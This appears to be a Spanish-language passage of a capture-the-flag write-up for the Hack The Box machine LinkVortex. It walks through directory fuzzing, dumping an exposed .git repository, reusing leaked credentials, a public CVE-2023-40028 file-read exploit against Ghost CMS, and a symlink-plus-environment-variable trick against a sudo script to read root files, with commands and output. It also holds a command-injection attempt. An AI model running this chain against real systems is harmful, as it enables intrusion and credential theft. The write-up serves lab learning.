</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.61 seconds
</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whatweb 10.10.11.47
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://10.10.11.47 <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Apache, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Apache<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.11.47<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://linkvortex.htb/<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://linkvortex.htb/ <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Apache<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.11.47<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.5.1<span style="color:#f92672">]</span>, MetaGenerator<span style="color:#f92672">[</span>Ghost 5.58<span style="color:#f92672">]</span>, Open-Graph-Protocol<span style="color:#f92672">[</span>website<span style="color:#f92672">]</span>, PoweredBy<span style="color:#f92672">[</span>Ghost,a<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>application/ld+json<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>BitByBit Hardware<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>Express<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Vamos a empezar a enumerar directorios con gobuster y de aquí lo más interesante que encontramos es un panel de login en /ghost.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster dir -u http://linkvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">200</span> -r
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url: http://linkvortex.htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method: GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads: <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes: <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent: gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Follow Redirect: true
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout: 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/about <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 8284<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/rss <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26682<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/feed <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26682<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/About <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 8284<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/RSS <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26682<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/private <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 12148<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/unsubscribe <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 24<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/LICENSE <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1065<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/cpu <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15472<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/Rss <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26682<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/ram <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 14746<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/ghost <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3787<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/psu <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15163<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/Private <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 12148<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/Feed <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 26682<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/Ghost <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3787<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/RAM <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 14746<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/vga <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15231<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/CPU <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15472<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/VGA <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15231<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">55968</span> / <span style="color:#ae81ff">220560</span> <span style="color:#f92672">(</span>25.38%<span style="color:#f92672">)</span>^C
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Keyboard interrupt detected, terminating.
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">55970</span> / <span style="color:#ae81ff">220560</span> <span style="color:#f92672">(</span>25.38%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> context canceled
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p><img alt="LinkVortex Machine 1" loading="lazy" src="/write-ups/linux/easy/linkvortex/Fotos/linkvortex_machine_1.png"></p>
<p>He estado mirando pero por el momento como no he encontrado ninguna vulnerabilidad en el panel, voy a seguir enumerando pero esta vez subdominios. Aquí conseguimos enumerar el subdominio dev.linkvortex.htb</p>
<p><img alt="LinkVortex Machine 2" loading="lazy" src="/write-ups/linux/easy/linkvortex/Fotos/linkvortex_machine_2.png"></p>
<p>Nos sale un cartel diciendo que la página aún esta en construcción, nosotros por el momento vamos a hacerle un listado de directorios para ver si sacamos algo más de información.</p>
<p>En un principio no me listaba nada con diretorios y he estado probando diccionarios hasta que he probado uno sobre metafiles y me ha descubierto el directorio .git/.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt:FUZZ -u http://dev.linkvortex.htb/FUZZ -fc <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/<span style="color:#e6db74">&#39;___\ /&#39;</span>___<span style="color:#ae81ff">\ </span>/<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>/<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/ __ __ /<span style="color:#ae81ff">\ \_</span>_/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \_\ \ \_\ \ \_</span>___/ <span style="color:#ae81ff">\ \_\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">\/</span>_/ <span style="color:#ae81ff">\/</span>_/ <span style="color:#ae81ff">\/</span>___/ <span style="color:#ae81ff">\/</span>_/
</span></span><span style="display:flex;"><span>v2.1.0
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>:: Method : GET
</span></span><span style="display:flex;"><span>:: URL : http://dev.linkvortex.htb/FUZZ
</span></span><span style="display:flex;"><span>:: Wordlist : FUZZ: /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt
</span></span><span style="display:flex;"><span>:: Follow redirects : false
</span></span><span style="display:flex;"><span>:: Calibration : false
</span></span><span style="display:flex;"><span>:: Timeout : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>:: Threads : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>:: Filter : Response status: <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.git/packed-refs <span style="color:#f92672">[</span>Status: 200, Size: 147, Words: 8, Lines: 4, Duration: 103ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/description <span style="color:#f92672">[</span>Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 103ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/logs/HEAD <span style="color:#f92672">[</span>Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 103ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git <span style="color:#f92672">[</span>Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/config <span style="color:#f92672">[</span>Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 103ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/HEAD <span style="color:#f92672">[</span>Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 102ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/ <span style="color:#f92672">[</span>Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 102ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.git/index <span style="color:#f92672">[</span>Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 103ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>118/118<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">132</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:01<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</span></span></code></pre></div><p>Para trabajar mejor con un entorno git y ver si encuentro algo interesante voy a dumperame el git a mi maquina local para navegar cómodamente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 -m venv entorno_virtual
</span></span><span style="display:flex;"><span>source entorno_virtual/bin/activate
</span></span><span style="display:flex;"><span>pip install git-dumper
</span></span><span style="display:flex;"><span>cd /home/borhub/Workspace/HTB/linkvortex/CONTENT/git/entorno_virtual
</span></span><span style="display:flex;"><span>git-dumper http://dev.linkvortex.htb/.git ./git
</span></span></code></pre></div><p>Luego de haber estado buscando un buen rato he encontrado lo que podrían ser unas credenciales en /ghost/core/test/regressions/api/admin/authentication.test.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">it(&#39;complete</span> <span style="color:#960050;background-color:#1e0010">setup&#39;,</span> <span style="color:#960050;background-color:#1e0010">async</span> <span style="color:#960050;background-color:#1e0010">function</span> <span style="color:#960050;background-color:#1e0010">()</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">const</span> <span style="color:#960050;background-color:#1e0010">email</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#39;test@example.com&#39;;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">const</span> <span style="color:#960050;background-color:#1e0010">password</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#39;OctopiFociPilfer45&#39;;</span>
</span></span></code></pre></div><p>Aquí realmente solo tenemos un ejemplo de contraseña pero antes habíamos visto en la web que un usuario llamado admin tenia varias publicaciones.</p>
<p><img alt="LinkVortex Machine 3" loading="lazy" src="/write-ups/linux/easy/linkvortex/Fotos/linkvortex_machine_3.png"></p>
<p>Con lo cual vamos a probar con el nombre de usuario + el dominio de la pagina web, junto con la contraseña que hemos visto en los archivos del .git/. Y así entramos al dashboard de la pagina web.</p>
<p><img alt="LinkVortex Machine 4" loading="lazy" src="/write-ups/linux/easy/linkvortex/Fotos/linkvortex_machine_4.png"></p>
<h1 id="acceso-inicial">Acceso inicial<a hidden class="anchor" aria-hidden="true" href="#acceso-inicial">#</a></h1>
<h2 id="cve-2023-40028-ghost-cms-arbitrary-file-read">CVE-2023-40028: Ghost CMS Arbitrary File Read<a hidden class="anchor" aria-hidden="true" href="#cve-2023-40028-ghost-cms-arbitrary-file-read">#</a></h2>
<p>En el whatweb anterior veíamos la versión de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.</p>
<blockquote>
<p>Ghost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.</p></blockquote>
<p><a href="https://github.com/godylockz/CVE-2023-40028/tree/main">https://github.com/godylockz/CVE-2023-40028/tree/main</a></p>
<p>Utilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuración en el cual hay unas credenciales también.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking authentication <span style="color:#f92672">(</span>username/password<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Admin session created successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Welcome to the Ghost file-read shell. Type help or ? to list commands.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file&gt; /var/lib/ghost/config.production.json
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:2368&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;server&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;port&#34;</span>: 2368,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;::&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;mail&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;transport&#34;</span>: <span style="color:#e6db74">&#34;Direct&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;logging&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;transports&#34;</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;stdout&#34;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;process&#34;</span>: <span style="color:#e6db74">&#34;systemd&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;paths&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;contentPath&#34;</span>: <span style="color:#e6db74">&#34;/var/lib/ghost/content&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;spam&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;user_login&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;minWait&#34;</span>: 1,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;maxWait&#34;</span>: 604800000,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;freeRetries&#34;</span>: <span style="color:#ae81ff">5000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;mail&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;transport&#34;</span>: <span style="color:#e6db74">&#34;SMTP&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;options&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Google&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;linkvortex.htb&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;port&#34;</span>: 587,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;auth&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;bob@linkvortex.htb&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;pass&#34;</span>: <span style="color:#e6db74">&#34;fibber-talented-worth&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file&gt;
</span></span></code></pre></div><p>Probamos a meter las credenciales obtenidas por ssh y obtenemos la terminal.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ssh bob@10.10.11.47
</span></span><span style="display:flex;"><span>bob@10.10.11.47<span style="color:#e6db74">&#39;s password:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Documentation: https://help.ubuntu.com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Management: https://landscape.canonical.com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Support: https://ubuntu.com/pro
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This system has been minimized by removing packages and content that are not required on a system that users do not log into.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To restore this content, you can run the &#39;</span>unminimize<span style="color:#960050;background-color:#1e0010">&#39;</span> command.
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Sun Apr <span style="color:#ae81ff">6</span> 17:56:25 <span style="color:#ae81ff">2025</span> from 10.10.14.74
</span></span><span style="display:flex;"><span>bob@linkvortex:~$ cat user.txt
</span></span><span style="display:flex;"><span>2c7f66b6d4d0********************
</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
<p>Cuando hacemos sudo -l vemos que nuestro usuario tiene permiso para ejecutar un archivo .sh como administrador sin necesidad de poner contraseña adjuntado un archivo acabado en .png.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:/opt/ghost$ sudo -l
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> bob on linkvortex:
</span></span><span style="display:flex;"><span>env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty, env_keep<span style="color:#f92672">+=</span>CHECK_CONTENT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User bob may run the following commands on linkvortex:
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
</span></span></code></pre></div><p>En un principio he intentado ejecutar comandos luego del archivo .png, pero detecta el uso de un segundo comando y es ahí cuando me pide la contraseña y ya el código no me deja ejecutar el comando.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh <span style="color:#e6db74">&#34;prueba.png; whoami&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> bob:
</span></span><span style="display:flex;"><span>Sorry, user bob is not allowed to execute <span style="color:#e6db74">&#39;/usr/bin/bash /opt/ghost/clean_symlink.sh prueba.png; whoami&#39;</span> as root on linkvortex.
</span></span></code></pre></div><h3 id="symlink-trickery-y-abuso-de-check_"><strong>Symlink Trickery y Abuso de CHECK_CONTENT</strong><a hidden class="anchor" aria-hidden="true" href="#symlink-trickery-y-abuso-de-check_">#</a></h3>
<p>Luego de revisar el código vi que el script revisa si el link simbólico del archivo .png para comprobar si contiene archivos sensibles como root o etc.</p>
<p>Con lo cual para evitar esto vamos a hacer un bypass para engañar el filtro. Lo que haremos será lo siguiente hacer que el archivo al que apunta el .png sea un archivo cualquiera que luego apunta a /root/root.txt.</p>
<p>hit-png -&gt; /home/bob/hit.txt | /home/bob/hit.txt -&gt; /root/root.txt</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:~$ ln -s /root/root.txt hit.txt
</span></span><span style="display:flex;"><span>bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png
</span></span></code></pre></div><blockquote>
<p>Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.</p></blockquote>
<p>Si ahora ejecutamos el script funcionará pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#codigo del script y porque no nos muestra el contenido</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> $CHECK_CONTENT;<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>	/usr/bin/echo <span style="color:#e6db74">&#34;Content:&#34;</span>
</span></span><span style="display:flex;"><span>	/usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png
</span></span></code></pre></div><p>Entonces le indicamos en el script que ponga el CHECK_CONTENT en true para que nos muestre la flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:~$ sudo CHECK_CONTENT<span style="color:#f92672">=</span>true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png
</span></span><span style="display:flex;"><span>Link found <span style="color:#f92672">[</span> /home/bob/hit.png <span style="color:#f92672">]</span> , moving it to quarantine
</span></span><span style="display:flex;"><span>Content:
</span></span><span style="display:flex;"><span>46df14**************************
</span></span><span style="display:flex;"><span>bob@linkvortex:~$
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
